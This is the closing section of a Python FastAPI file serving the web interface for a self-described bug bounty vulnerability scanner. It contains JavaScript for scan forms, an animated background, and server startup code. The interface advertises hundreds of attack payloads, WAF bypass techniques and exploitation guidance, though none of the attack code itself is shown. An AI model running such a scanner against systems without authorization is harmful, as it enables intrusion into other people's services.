                    
                    for (let i = 0; i < drops.length; i++) {
                        const text = charArray[Math.floor(Math.random() * charArray.length)];
                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                        
                        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                            drops[i] = 0;
                        }
                        drops[i]++;
                    }
                }
                
                setInterval(draw, 35);
            }
            
            // Initialize matrix effect
            createMatrixEffect();
            
            // Vulnerability checkbox toggle
            function toggleVuln(element, value) {
                const checkbox = element.querySelector('input[type="checkbox"]');
                checkbox.checked = !checkbox.checked;
                
                if (checkbox.checked) {
                    element.classList.add('checked');
                } else {
                    element.classList.remove('checked');
                }
            }
            
            // Initialize checked states
            document.querySelectorAll('.vuln-checkbox input[type="checkbox"]:checked').forEach(checkbox => {
                checkbox.closest('.vuln-checkbox').classList.add('checked');
            });
            
            // Comprehensive scan function
            async function startComprehensiveScan() {
                const button = document.getElementById('compScanBtn');
                const output = document.getElementById('output');
                const url = document.getElementById('comp_url').value.trim();
                const endpoint = document.getElementById('comp_endpoint').value.trim();
                const techStack = document.getElementById('comp_tech').value.trim();
                
                // Validation
                if (!url || !endpoint) {
                    alert('❌ Target URL and endpoint are required');
                    return;
                }
                
                if (!url.startsWith('http://') && !url.startsWith('https://')) {
                    alert('❌ URL must start with http:// or https://');
                    return;
                }
                
                // Get selected vulnerability types
                const selectedVulns = Array.from(document.querySelectorAll('#compVulnTypes .vuln-checkbox input[type="checkbox"]:checked'))
                    .map(cb => cb.value);
                
                if (selectedVulns.length === 0) {
                    alert('❌ Please select at least one vulnerability type');
                    return;
                }
                
                // Confirm scan
                const confirmMessage = `🎯 COMPREHENSIVE BUG BOUNTY SCAN\\n\\nTarget: ${url}${endpoint}\\nVulnerability Types: ${selectedVulns.join(', ')}\\n\\n⚠️  ENSURE YOU HAVE AUTHORIZATION TO TEST THIS TARGET\\n\\nThis will execute 500+ payloads with advanced bypass techniques.\\nContinue?`;
                if (!confirm(confirmMessage)) {
                    return;
                }
                
                // UI Updates
                button.disabled = true;
                button.innerHTML = '<span class="loading"></span>COMPREHENSIVE SCAN IN PROGRESS...';
                output.style.display = 'block';
                output.innerHTML = '<div class="status info">🔥 Initializing comprehensive vulnerability scan with advanced techniques...</div>';
                
                // Parse tech stack
                const techStackArray = techStack ? techStack.split(',').map(item => {
                    const parts = item.trim().split(' ');
                    const name = parts.shift() || 'Unknown';
                    const version = parts.join(' ') || null;
                    return { name: name, version: version };
                }) : [];
                
                const scanData = {
                    url: url,
                    target_endpoint: endpoint,
                    tech_stack: techStackArray,
                    vulnerability_types: selectedVulns
                };
                
                try {
                    const response = await fetch('/start_comprehensive_scan', {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify(scanData)
                    });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                    }
                    
                    const result = await response.json();
                    
                    if (result.status === 'comprehensive_scan_initiated') {
                        output.innerHTML = `
                            <div class="status success">✅ ${result.message}</div>
                            
                            <strong>🎯 COMPREHENSIVE SCAN INITIATED</strong>
                            • Target: ${result.target}
                            • Vulnerability Types: ${result.vulnerability_types.join(', ')}
                            • Started: ${new Date(result.timestamp).toLocaleString()}
                            
                            <strong>🔥 ADVANCED FEATURES ACTIVATED:</strong>
                            ${result.features.map(feature => `• ${feature}`).join('\\n')}
                            
                            <strong>📊 SCAN DETAILS:</strong>
                            • 500+ attack payloads will be tested
                            • 12 WAF bypass techniques applied
                            • Multiple parameter names tested per payload
                            • Response time analysis for blind vulnerabilities
                            • Error-based detection with pattern matching
                            • AI-powered vulnerability analysis and reporting
                            
                            <strong>📋 MONITORING:</strong>
                            • Real-time results logged to server console
                            • Look for "VULNERABILITIES DETECTED" messages
                            • Advanced LLM analysis will provide detailed reports
                            • CVSS scoring and exploitation guidance included
                            
                            <strong>🎯 BUG BOUNTY OPTIMIZATION:</strong>
                            • Results optimized for bug bounty platforms
                            • Detailed proof-of-concept recommendations
                            • Business impact assessment included
                            • Remediation guidance provided
                            
                            <em>⚡ This scan uses elite-level penetration testing techniques with comprehensive payload sets and advanced bypass methods specifically designed for professional bug bounty hunting.</em>
                        `;
                    } else {
                        output.innerHTML = `<div class="status error">❌ Unexpected response: ${JSON.stringify(result)}</div>`;
                    }
                    
                } catch (error) {
                    console.error('Comprehensive scan error:', error);
                    output.innerHTML = `<div class="status error">❌ Comprehensive scan failed: ${error.message}</div>`;
                } finally {
                    button.disabled = false;
                    button.innerHTML = '🚀 LAUNCH COMPREHENSIVE SCAN';
                }
            }
            
            // Quick scan function
            async function startQuickScan() {
                const button = document.getElementById('quickScanBtn');
                const output = document.getElementById('output');
                const url = document.getElementById('quick_url').value.trim();
                const vulnType = document.getElementById('quick_vuln').value;
                const method = document.getElementById('quick_method').value;
                const data = document.getElementById('quick_data').value.trim();
                
                // Validation
                if (!url) {
                    alert('❌ Target URL is required');
                    return;
                }
                
                if (!url.startsWith('http://') && !url.startsWith('https://')) {
                    alert('❌ URL must start with http:// or https://');
                    return;
                }
                
                // Validate JSON data
                try {
                    JSON.parse(data);
                } catch (e) {
                    alert('❌ Request data must be valid JSON');
                    return;
                }
                
                // UI Updates
                button.disabled = true;
                button.innerHTML = '<span class="loading"></span>EXECUTING QUICK SCAN...';
                output.style.display = 'block';
                output.innerHTML = '<div class="status info">⚡ Executing quick vulnerability scan...</div>';
                
                try {
                    const response = await fetch('/quick_scan', {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: new URLSearchParams({
                            url: url,
                            vulnerability_type: vulnType,
                            method: method,
                            data: data
                        })
                    });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                    }
                    
                    const result = await response.json();
                    
                    if (result.status === 'scan_completed') {
                        output.innerHTML = `
                            <div class="status success">✅ Quick scan completed</div>
                            
                            <strong>🎯 QUICK SCAN RESULTS</strong>
                            • Target: ${result.target}
                            • Vulnerability Type: ${result.vulnerability_type.toUpperCase()}
                            • Completed: ${new Date(result.timestamp).toLocaleString()}
                            
                            <strong>📊 DETAILED RESULTS:</strong>
                            ${result.results}
                        `;
                    } else {
                        output.innerHTML = `<div class="status error">❌ Unexpected response: ${JSON.stringify(result)}</div>`;
                    }
                    
                } catch (error) {
                    console.error('Quick scan error:', error);
                    output.innerHTML = `<div class="status error">❌ Quick scan failed: ${error.message}</div>`;
                } finally {
                    button.disabled = false;
                    button.innerHTML = '⚡ EXECUTE QUICK SCAN';
                }
            }
            
            // Keyboard shortcuts
            document.addEventListener('keydown', function(event) {
                if (event.ctrlKey && event.key === 'Enter') {
                    const activeElement = document.activeElement;
                    if (activeElement && activeElement.closest('.scan-mode')) {
                        if (activeElement.closest('.scan-mode').querySelector('#compScanBtn')) {
                            startComprehensiveScan();
                        } else {
                            startQuickScan();
                        }
                    }
                }
            });
            
            // Auto-focus first input
            document.getElementById('comp_url').focus();
            
            // Window resize handler for matrix effect
            window.addEventListener('resize', function() {
                const matrixBg = document.getElementById('matrixBg');
                matrixBg.innerHTML = '';
                createMatrixEffect();
            });
        </script>
    </body>
    </html>
    """)

# APIルーター追加
app.include_router(router)

# --- メイン実行部分 ---
if __name__ == "__main__":
    try:
        logger.info(f"🔥 Elite Bug Bounty Scanner v3.0 starting on {config.host}:{config.port}")
        logger.info(f"🎯 Features: Advanced payloads, WAF bypass, comprehensive testing")
        logger.info(f"🤖 LLM Analysis: {'Enabled' if config.google_api_key else 'Disabled (set GOOGLE_API_KEY to enable)'}")
        logger.info(f"🚀 Ready for professional bug bounty hunting!")
        
        uvicorn.run(
            app, 
            host=config.host, 
            port=config.port,
            log_level=config.log_level.lower(),
            access_log=True
        )
    except Exception as e:
        logger.error(f"Server startup failed: {e}")
        raise
